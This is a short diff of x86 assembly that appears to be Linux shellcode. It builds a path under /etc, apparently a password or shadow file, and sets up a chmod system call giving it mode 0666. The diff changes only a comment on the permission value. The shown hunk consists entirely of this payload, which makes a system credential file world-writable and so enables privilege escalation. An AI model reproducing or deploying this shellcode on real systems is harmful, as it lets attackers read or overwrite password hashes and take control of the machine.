@@ -10,7 +10,7 @@ _start:
             push dword 0x2f2f6374
             push dword 0x652f2f2f
             mov ebx,esp
-	    push word 0x1B7  ;411
+	    push word 0x1B7  ;permission 667
 	    pop ecx
 	    sub ecx,0x1
             mov al,0xf
